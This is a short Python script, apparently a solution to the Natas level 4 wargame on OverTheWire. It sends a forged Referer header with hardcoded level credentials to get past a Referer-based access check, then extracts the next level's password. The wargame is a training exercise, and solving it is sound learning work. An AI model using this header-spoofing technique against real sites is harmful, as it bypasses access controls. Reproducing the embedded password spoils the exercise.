#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.get(url, auth=(username, password), headers=headers)
content = response.text

# print(content)
print(re.findall('The password for natas5 is (.*)', content)[0])
